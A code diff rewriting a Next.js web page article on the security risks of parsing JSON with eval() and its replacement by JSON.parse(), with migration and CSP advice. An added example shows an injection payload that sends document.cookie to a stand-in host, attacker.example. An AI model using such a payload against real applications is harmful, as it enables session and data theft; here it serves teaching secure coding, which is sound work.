@@ -2,9 +2,9 @@ import type { Metadata } from "next";
 import { AlertTriangle, ShieldOff, Code, CheckCircle } from "lucide-react";
 
 export const metadata: Metadata = {
-  title: "Security Risks of Eval-Based JSON Parsing | Web Security",
+  title: "Security Risks of Eval-Based JSON Parsing | Safe JSON Parsing",
   description:
-    "Learn why using JavaScript's eval() function to parse JSON is dangerous and how it exposes your application to critical security vulnerabilities.",
+    "Using eval() to parse JSON turns untrusted data into executable JavaScript. Learn the real risks, CSP impact, and the safe replacement with JSON.parse().",
 };
 
 export default function EvalJsonRisksArticle() {
@@ -17,212 +17,206 @@ export default function EvalJsonRisksArticle() {
 
       <div className="space-y-6">
         <p>
-          Parsing JSON data is a fundamental task in web development, especially when interacting with APIs. JSON
-          (JavaScript Object Notation) is widely used due to its simplicity and direct mapping to JavaScript objects.
-          However, how you parse JSON matters significantly, particularly from a security standpoint. An outdated and
-          dangerous method, unfortunately still sometimes encountered in older codebases, is using the JavaScript{" "}
-          <code>eval()</code> function to parse JSON strings.
+          Using <code>eval()</code> to parse JSON is a security bug, not a shortcut. The common legacy pattern{" "}
+          <code>eval("(" + text + ")")</code> does not parse JSON safely. It executes the input as JavaScript, which
+          means attacker-controlled data can become attacker-controlled code.
         </p>
         <p>
-          This article explores the severe security implications of using <code>eval()</code> for JSON parsing and
-          strongly advocates for the modern and safe alternative, <code>JSON.parse()</code>.
+          For a search visitor landing here with one question, the answer is simple: if the input is supposed to be
+          JSON, use <code>JSON.parse()</code> or a framework helper built on top of it, such as{" "}
+          <code>response.json()</code>. Do not use <code>eval()</code>, <code>new Function()</code>, or other
+          string-to-code tricks to handle JSON.
         </p>
 
         <h2 className="text-2xl font-semibold mt-8 flex items-center">
           <ShieldOff className="w-6 h-6 mr-2 text-red-500" />
-          What Does <code>eval()</code> Do (and Why Is It Dangerous)?
+          Why <code>eval()</code> Is the Wrong Primitive
         </h2>
         <p>
-          The <code>eval()</code> function in JavaScript is powerful and inherently risky. It takes a string as an
-          argument and executes it as if it were JavaScript code.
+          <code>eval()</code> takes a string and runs it as JavaScript code. A JSON parser should do one thing only:
+          read data. <code>eval()</code> does something much broader and much more dangerous.
         </p>
 
         <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
           <pre>
-            {`const codeString = "console.log('Hello, World!');";
-eval(codeString); // Executes the string as JS code`}
+            {`const codeString = "console.log('Hello from eval')";
+eval(codeString); // Executes the string as code, not as data`}
           </pre>
         </div>
 
         <p>
-          While this might seem convenient, the danger lies in the fact that <code>eval()</code> will execute *any*
-          valid JavaScript code contained within the string, not just code that represents a data structure.
+          That distinction matters because JavaScript object literal syntax is broader than JSON. <code>eval()</code>{" "}
+          accepts things JSON should reject, including appended statements, comments, getters, function calls, and
+          other JavaScript-only syntax. That creates a direct path from malformed input to code execution.
+        </p>
+        <p>
+          It also conflicts with modern defense-in-depth practices. A strict Content Security Policy typically blocks{" "}
+          <code>eval()</code> unless you opt into <code>'unsafe-eval'</code>, which weakens the policy for the entire
+          application.
         </p>
 
         <h2 className="text-2xl font-semibold mt-8 flex items-center">
           <AlertTriangle className="w-6 h-6 mr-2 text-red-500" />
-          The Core Risk: Arbitrary Code Execution
+          What an Attacker Gets From Eval-Based Parsing
         </h2>
         <p>
-          When you use <code>eval()</code> to parse a JSON string received from an external source (like an API, user
-          input, etc.), you are essentially trusting that the source will *only* send valid JSON and nothing else. If an
-          attacker can control or inject data into the JSON string your application receives, they can insert malicious
-          JavaScript code that <code>eval()</code> will then execute within the context of your page or server
-          environment.
+          When a string is executed instead of parsed, invalid input is no longer just a parsing failure. It becomes a
+          chance to run code in the same context as your application.
         </p>
         <p>This allows attackers to perform actions like:</p>
         <ul className="list-disc pl-6 space-y-2 my-4">
-          <li>Stealing sensitive user data (cookies, local storage, input values).</li>
+          <li>Stealing browser data such as cookies, tokens, local storage values, or form contents.</li>
           <li>
-            Performing actions on behalf of the user (e.g., making requests to other parts of your application or
-            third-party sites).
+            Sending authenticated requests as the current user because the malicious code runs inside your application.
           </li>
-          <li>Defacing your application's UI.</li>
-          <li>Redirecting users to malicious sites.</li>
           <li>
-            In server-side Node.js environments, potentially accessing local files or executing system commands
-            (depending on surrounding code and privileges).
+            Changing page behavior, redirecting users, or injecting more malicious script into the DOM.
           </li>
+          <li>
+            Reading server-side secrets, files, or internal network resources in Node.js, depending on where the
+            evaluated string runs and which objects are in scope.
+          </li>
+          <li>Forcing you to relax CSP with <code>'unsafe-eval'</code>, which expands the blast radius of XSS bugs.</li>
         </ul>
 
         <h2 className="text-2xl font-semibold mt-8 flex items-center">
           <Code className="w-6 h-6 mr-2 text-orange-500" />
-          Malicious Payload Examples
+          Realistic Exploit Examples
         </h2>
         <p>
-          Consider a scenario where your application expects JSON like{" "}
-          <code>&#x7b;"name": "Alice", "age": 30&#x7d;</code>
-          and parses it using <code>eval('(' + jsonData + ')')</code> (the parentheses are sometimes used to force the
-          string to be interpreted as an expression). An attacker might send a payload like this:
+          Legacy code often wraps the input in parentheses before calling <code>eval()</code>. That does not make it
+          safe. It still allows non-JSON JavaScript to run.
         </p>
 
         <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
-          <h3 className="text-lg font-medium">Example 1: Data Exfiltration</h3>
+          <h3 className="text-lg font-medium">Example 1: Statement Injection Outside the Object</h3>
           <pre>
-            {`const maliciousJson = \`
-{
-  "name": "Attacker",
-  "age": 99,
-  "__proto__": {
-    "toString": () => { // Inject code into a standard object method
-      alert('Data stolen: ' + document.cookie); // Or send it to an attacker's server
-      return 'Injected';
-    }
-  }
-}
+            {`const attackerControlled = \`
+{"ok": true}); fetch("https://attacker.example/collect?c=" + encodeURIComponent(document.cookie)); ({ "ignored": true }
 \`;
-// Assuming eval() is used:
-// eval('(' + maliciousJson + ')');
-// If the resulting object is later stringified or used in contexts that call toString,
-// the malicious code runs.`}
+
+// Vulnerable:
+eval("(" + attackerControlled + ")");
+
+// Safe alternative:
+JSON.parse(attackerControlled); // Throws SyntaxError`}
           </pre>
           <p className="mt-3">
-            This example exploits prototype manipulation, which can be executed by <code>eval()</code>. When the
-            resulting object or its properties are later processed (e.g., converting to string), the injected code runs.
+            The payload closes the first object, runs a second statement, then opens another expression so the overall{" "}
+            <code>eval()</code> call still succeeds. A real parser rejects this immediately because it is not valid
+            JSON.
           </p>
         </div>
 
         <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
-          <h3 className="text-lg font-medium">Example 2: Direct Code Execution</h3>
+          <h3 className="text-lg font-medium">Example 2: JavaScript Features Hidden in an Object Literal</h3>
           <pre>
-            {`const anotherMaliciousJson = \`
+            {`const notActuallyJson = \`
 {
-  "data": "some value"
-}, alert('You have been hacked!'); // Malicious code outside the object
+  "user": "alice",
+  run: (() => {
+    console.log("Executed while being 'parsed'");
+    return "done";
+  })()
+}
 \`;
-// Assuming eval() is used:
-// eval('(' + anotherMaliciousJson + ')');
-// The alert('You have been hacked!') part executes.`}
+
+// Vulnerable:
+const parsed = eval("(" + notActuallyJson + ")");
+console.log(parsed.run); // "done"
+
+// Safe alternative:
+JSON.parse(notActuallyJson); // Throws SyntaxError`}
           </pre>
           <p className="mt-3">
-            This example shows how easily code can be appended or injected into a string intended for{" "}
-            <code>eval()</code>. Anything after a valid JSON structure within the string passed to <code>eval()</code>{" "}
-            can be executed as subsequent JavaScript statements.
+            This is the deeper problem: <code>eval()</code> is not a strict JSON parser at all. It accepts executable
+            JavaScript syntax inside an object literal, so code can run during the parse step itself.
           </p>
         </div>
 
         <h2 className="text-2xl font-semibold mt-8">
-          JSON Hijacking and <code>eval()</code>
+          Historical Note: JSON Hijacking Was Real, But It Is Not the Main Risk Today
         </h2>
         <p>
-          While less common now due to browser protections, in older web environments,
-          <code>eval()</code>-based JSON parsing was linked to a vulnerability called JSON Hijacking.
+          Older articles often mention JSON hijacking, where browsers could be tricked into executing JSON responses as
+          script. That class of issue helped push the ecosystem away from treating JSON as executable JavaScript.
         </p>
         <p>
-          If sensitive data was returned as a simple JSON array (e.g., <code>[&#x7b;...&#x7d;, &#x7b;...&#x7d;]</code>),
-          this response was also a valid JavaScript array literal. In some scenarios (especially pre-ES5 browsers or
-          specific execution contexts like overriding Array constructors), the malicious page could potentially read the
-          values of this array. Similarly, if it was a simple object literal (<code>&#x7b;...&#x7d;</code>), it could
-          potentially be assigned to a variable if the response was wrapped in parentheses.
-        </p>
-        <p>
-          A malicious page on another domain could include a script tag pointing to the vulnerable endpoint. Because
-          JavaScript allows executing code from different origins (subject to SOP for reading responses), if the
-          endpoint returned JSON data formatted as an array or object literal and the browser didn't have robust
-          cross-origin read blocking, the malicious script could potentially capture and access the data through{" "}
-          <code>eval()</code> or other means that interpreted the response directly as JavaScript code.
-        </p>
-        <p>
-          Modern browsers and the widespread use of <code>JSON.parse()</code> mitigate this specific attack vector
-          significantly, but it highlights the fundamental danger of treating data from an untrusted source as
-          executable code.
+          In modern applications, the more immediate problem is simpler: if you use <code>eval()</code> for parsing,
+          you are voluntarily executing attacker-controlled text in your browser or server process. That is the risk to
+          prioritize during code review and remediation.
         </p>
 
         <h2 className="text-2xl font-semibold mt-8 flex items-center">
           <CheckCircle className="w-6 h-6 mr-2 text-green-500" />
-          The Safe Alternative: <code>JSON.parse()</code>
+          The Safe Replacement: <code>JSON.parse()</code>
         </h2>
         <p>
-          The correct and secure way to parse JSON in JavaScript (both browser and Node.js) is by using the built-in{" "}
-          <code>JSON.parse()</code> method.
+          The correct replacement in browsers and Node.js is <code>JSON.parse()</code>. It parses JSON text as data
+          only. If the string is not valid JSON, it throws a <code>SyntaxError</code> instead of executing anything.
         </p>
 
         <div className="bg-gray-100 p-4 rounded-lg dark:bg-gray-800 my-4">
           <pre>
-            {`const safeJsonString = '{"name": "Alice", "age": 30}';
+            {`const text = '{"id":"42","name":"Alice"}';
+
 try {
-  const parsedData = JSON.parse(safeJsonString);
-  console.log(parsedData.name); // Output: Alice
+  const value = JSON.parse(text);
+
+  if (!value || typeof value !== "object" || typeof value.id !== "string") {
+    throw new Error("Unexpected payload shape");
+  }
+
+  console.log(value.name); // Alice
 } catch (error) {
-  console.error("Failed to parse JSON:", error); // Handles invalid JSON
+  console.error("Invalid or unexpected JSON:", error);
 }`}
           </pre>
         </div>
 
         <p>
-          <code>JSON.parse()</code> is designed *specifically* for parsing JSON. It is a dedicated parser that
-          understands the JSON specification. It does *not* execute the content of the string as JavaScript code. If the
-          input string is not valid JSON, <code>JSON.parse()</code> will throw a <code>SyntaxError</code>, preventing
-          any malicious code from being executed.
+          Safer parsing is only step one. You should still validate the shape of the resulting data before using it in
+          business logic, rendering it into the page, or merging it into application state.
         </p>
 
         <h2 className="text-2xl font-semibold mt-8">
-          <code>JSON.parse()</code> vs. <code>eval()</code> for JSON
+          Practical Migration Advice
         </h2>
 
         <ul className="list-disc pl-6 space-y-2 my-4">
           <li>
-            <strong>Security:</strong> <code>JSON.parse()</code> is safe because it only parses data; it doesn't execute
-            code. <code>eval()</code> is unsafe because it executes *any* code, including malicious injections.
+            Replace patterns such as <code>eval(text)</code> and <code>eval("(" + text + ")")</code> with{" "}
+            <code>JSON.parse(text)</code>.
           </li>
           <li>
-            <strong>Performance:</strong> <code>JSON.parse()</code> is significantly faster and more efficient than{" "}
-            <code>eval()</code> for parsing JSON, as it's optimized for this specific task.
+            If the upstream system sends JavaScript-like data with single quotes, comments, or trailing commas, fix the
+            serializer at the source instead of loosening your parser.
           </li>
           <li>
-            <strong>Strictness:</strong> <code>JSON.parse()</code> strictly enforces the JSON format.{" "}
-            <code>eval()</code> is more lenient and might accept things that are valid JavaScript literals but not valid
-            JSON (e.g., using single quotes for strings, trailing commas, comments). This strictness helps catch
-            malformed data.
+            Review HTTP helpers too. Prefer <code>response.json()</code> or your framework's built-in JSON handling so
+            raw string parsing is minimized.
           </li>
           <li>
-            <strong>Purpose:</strong> <code>JSON.parse()</code>'s sole purpose is parsing JSON. <code>eval()</code>'s
-            purpose is general code execution, which is overly broad and dangerous for data parsing.
+            Search for related string-execution APIs like <code>new Function()</code> and string-based{" "}
+            <code>setTimeout()</code> or <code>setInterval()</code> if you are auditing an older codebase.
+          </li>
+          <li>
+            After removing <code>eval()</code>, review your Content Security Policy. Many teams can then drop{" "}
+            <code>'unsafe-eval'</code>, which is a meaningful hardening improvement.
           </li>
         </ul>
 
         <h2 className="text-2xl font-semibold mt-8">
-          Conclusion: Always Use <code>JSON.parse()</code>
+          Bottom Line
         </h2>
         <p>
-          The use of <code>eval()</code> for parsing JSON is a severe security vulnerability and should be avoided under
-          all circumstances, especially when dealing with data from external or untrusted sources. Modern JavaScript
-          environments provide the dedicated, secure, and performant method <code>JSON.parse()</code>.
+          Eval-based JSON parsing is dangerous because it turns untrusted input into executable code. The vulnerability
+          is not theoretical, and the fix is straightforward: parse JSON with <code>JSON.parse()</code>, validate the
+          resulting data, and remove any dependency on <code>'unsafe-eval'</code> where possible.
         </p>
         <p>
-          If you encounter old code that uses <code>eval()</code> for JSON parsing, it should be refactored immediately
-          to use <code>JSON.parse()</code>. This simple change is a critical step in protecting your application and
-          users from arbitrary code execution attacks.
+          If you find this pattern in a legacy codebase, treat it as a security remediation task, not just a cleanup
+          item. It affects correctness, exploitability, and the overall security posture of the application.
         </p>
       </div>
     </>
